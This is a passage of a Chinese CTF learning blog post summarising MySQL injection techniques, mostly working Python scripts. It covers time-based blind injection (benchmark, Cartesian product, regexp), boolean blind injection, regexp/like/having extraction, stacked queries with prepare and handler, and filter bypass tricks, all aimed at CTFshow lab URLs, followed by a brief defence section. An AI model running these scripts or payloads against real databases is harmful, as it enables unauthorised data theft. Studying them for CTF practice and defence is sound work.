class="string">&#x27;http://9b2a89ce-8e84-471c-9b2e-be262825623d.chall.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),1)&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),1)&quot;.format(i,j)</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),1)&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其实就是设置了两个sleep函数，避免请求过于频繁造成服务器不稳定。</p>
+<h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><p>其实也是通过执行语句造成一定时间延迟，产生一个判段条件，贴脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://60d71394-4bcb-4ed0-83a9-0594c2903163.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.columns A,information_schema.columns B),1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.15</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也是把sleep(3) 那里换成了其他造成时间延迟的函数语句。</p>
+<h5 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h5><p>原理和上面差不多，都是为了产生一个时间延迟作为判断条件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">url=<span class="string">&#x27;http://fc6050d5-d70f-4130-8072-f9c0e4489bac.challenge.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line">time=<span class="string">&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;))regexp &#x27;(a.*)+(a.*)+b&#x27;&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,&#123;&#125;,1)&quot;.format(i,j,time)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,&#123;&#125;,1)&quot;.format(i,j,time)</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;&#125;,1))&lt;&#123;&#125;,&#123;&#125;,1)&quot;</span>.<span class="built_in">format</span>(i,j,time)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.3</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">regexp 可换成rlike</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他盲注"><a href="#其他盲注" class="headerlink" title="其他盲注"></a>其他盲注</h4><p>这里以<code>CTFshow</code>的一个题目为例子，没有任何过滤</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://7278c3bd-3813-42c6-819d-fb41ca76b0cb.challenge.ctf.show:8080/api/v4.php?id=1&#x27; and &quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#爆破database()</span></span><br><span class="line">        <span class="comment">#payload=f&#x27; if( ascii( substr((select database()),&#123;i&#125;,1) )&gt;&#123;mid&#125;,1,0 ) --+ &#x27;</span></span><br><span class="line">        <span class="comment">#爆破table</span></span><br><span class="line">        <span class="comment">#payload=f&#x27; if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow_web&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆破字段名</span></span><br><span class="line">        <span class="comment">#payload=f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_user4&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆值</span></span><br><span class="line">        payload = <span class="string">f&#x27;if( ascii(substr( (select  password from ctfshow_user4 limit 24,1) ,<span class="subst">&#123;i&#125;</span>,1) )&gt; <span class="subst">&#123;mid&#125;</span> , 1 , 0) -- -&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这是一个很常见的二分法盲注的例子，一位一位的字符去爆，当然也可能存在着过滤，比如 不让你用ascii了，我们可以用ord起到同样的效果，那ord也不让你用呢，那就直接比较字符，不去比较它们的ASCII码了，把<code>&#123;mid&#125;</code> 这里改成 <code>&#39;&#123;chr(mid)&#125;&#39;</code>   </p>
+<p>然后就是 <code>regexp</code> 和 <code>like</code> 在盲注中的应用，这两个的效果是差不多的，只是like在使用的时候，需要多一个 <code>%</code> 来模糊匹配。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://0d05e2b9-e8a5-4bbc-b292-a404ac94b658.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">dicts=<span class="string">&#x27;ctfshow&#123;8051349abcdef-267ghijklnmopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="comment">#datas=&quot;0x&quot;+(flag+j).encode().hex() 这里转成16进制防止字符干扰</span></span><br><span class="line">        payload=<span class="string">f&#x27;(ctfshow_user)where(pass)regexp(<span class="subst">&#123;flag+j&#125;</span>)&#x27;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&quot;tableName&quot;</span>:payload&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#然后如果是使用 like，payload改成： payload=f&#x27;(ctfshow_user)where(pass)like(&#123;flag+j+%&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>用<code>regexp</code>和<code>like</code>的时候，每次比较的是一个整体，已经爆破出来的数据，和之前每次比较一位字符是有区别的，但是本质都是一个一个字符爆的。</p>
+<p>通过连接查询   <code>right left  join on </code>  去创造不同的回显条件</p>
+<p>给的查询语句为：<code>select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://2bc36ce1-c9d7-4b8d-9305-1ec6c7978d7e.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">dicts=<span class="string">&#x27;ctfshow&#123;8051349abcdef-267ghijklnmopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        datas=<span class="string">&quot;0x&quot;</span>+(flag+j).encode().<span class="built_in">hex</span>()</span><br><span class="line">        payload=<span class="string">f&#x27;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(<span class="subst">&#123;datas&#125;</span>)&#x27;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&quot;tableName&quot;</span>:payload&#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>having like</code> 这样来完成注入:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStrNum</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span>+=<span class="string">&quot;char(&quot;</span>+createNum(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span>+=<span class="string">&quot;,char(&quot;</span>+createNum(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://8cd41ba6-79d8-444d-a809-277220c33e94.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">f&#x27;ctfshow_user group by pass having pass like(concat(<span class="subst">&#123;createStrNum(flag+j+<span class="string">&quot;%&quot;</span>)&#125;</span>))&#x27;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:payload<span class="comment">#&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;.format(createStrNum(flag+j+&quot;%&quot;))</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这里数字被过滤了，我们可以利用mysql特性如构造，比如：</p>
+<p><img src="https://i.loli.net/2021/04/28/5sDjPTCEzfuaqve.png" alt="hello.png"></p>
+<p>利用这个原理，可以把数字全部转换成 true 相加的形式。</p>
+<h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><p>这里单独来说其他注入，因为有些有回显有些无回显，就单独拿出来说了。</p>
+<h4 id="limit下注入"><a href="#limit下注入" class="headerlink" title="limit下注入"></a>limit下注入</h4><h5 id="报错方式"><a href="#报错方式" class="headerlink" title="报错方式"></a>报错方式</h5><p><code> procedure analyse(extractvalue(1,concat(1,database())),1)</code></p>
+<h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><p><code>PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code>  </p>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入可以执行多个mysql语句，大多数注入方式比较巧妙，比如涉及到改表的名字，交换列位置（其实就是改一下两个列的名字)，还可以用到预编译，姿势挺多的。</p>
+<h5 id="结合预处理"><a href="#结合预处理" class="headerlink" title="结合预处理"></a>结合预处理</h5><p><code>username=user1&#39;;prepare myangs from concat(&#39;se&#39;,&#39;lect &#39;,&#39;database()&#39;);execute myangs;</code></p>
+<p>这里用 concat 来绕过过滤，或者直接把我们想要查询的语句 16 进制编码一下:</p>
+<p><code>username=user1&#39;;prepare myangs from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute myangs</code></p>
+<h5 id="结合handler"><a href="#结合handler" class="headerlink" title="结合handler"></a>结合handler</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;;handler `ctfshow_flagasa` open;handler `ctfshow_flagasa`read first;</span><br></pre></td></tr></table></figure>
+
+<p>这里表名需要用一下反引号</p>
+<p>修改表名这个方法可以参考一下强网杯随便注。</p>
+<h4 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h4><p>之前都说的是查(select),其实 增删改也差不多，也可以注入查的语句，最后回显给我们，也可以涉及到时间盲注，布尔盲注等等。本质还是差不多的，只是有一个细节需要注意，删和改 作用于多条记录，所以写时间盲注脚本的时候，需要算好时间。在sleep()函数那里做一个更改</p>
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p>这个是在我们拿不到列名的情况下完成注入攻击，其实是给列名取了一个别名。我们在本地测试一下：</p>
+<p>语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `1` from (select 1,2 union select * from ctf) users;</span><br><span class="line">select  a  from (select 1 as a,2 union select * from ctf) users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/01/t5EmUVqJL94Qkzg.png" alt="world.png"></p>
+<h2 id="绕过-trick"><a href="#绕过-trick" class="headerlink" title="绕过&amp;trick"></a>绕过&amp;trick</h2><p>就是常见的一些绕过过滤的方式</p>
+<p>比如空格被过滤，可以换  &#x2F;**&#x2F; ,  (), %09 等</p>
+<p>双写绕过，大小写绕过等</p>
+<p>information_schema.tables 表用不了了，我们可以换成 <code>mysql.innodb_table_stats </code> 或者 <code>mysql.innodb_index_stats</code> 来获得 table_name </p>
+<p>不过后面就需要利用到无列名注入了。</p>
+<p>用<code>ffifdyop</code> 绕过  <code>md5($password,true)</code></p>
+<p>还有一些比如反斜杠 \ </p>
+<p>等等还有很多。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>SQL注入的防御分两块</p>
+<p>一方面是过滤危险参数，但是这点不是最佳方案，因为这样会降低用户体验，某安全大牛曾经说过，安全问题的解决不应该以牺牲用户体验为代价。</p>
+<p>另一方面就是做到代码和用户输入数据的彻底分离，数据就是数据，代码就是代码。但是这个对程序员编程素养要求挺高，安全素颜也挺高。不得不说，SQL注入仍还是实战中常见的漏洞。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里把常见的SQL注入姿势做了一个梳理，当然变形很多，一篇文章无法总结所有的姿势，也远不止这些。以这些为基点，去发散自己的思维，万变不离其宗。这才是核心。遇到问题先冷静思考。要开始框架的慢慢审计了( 太菜了)</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/11/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98%E4%B9%8Bpin%E7%A0%81/" rel="prev" title="CTF中python问题之pin码">
+                  <i class="fa fa-angle-left"></i> CTF中python问题之pin码
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/03/XDCMS3-0-1/" rel="next" title="XDCMS3.0.1">
+                  XDCMS3.0.1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
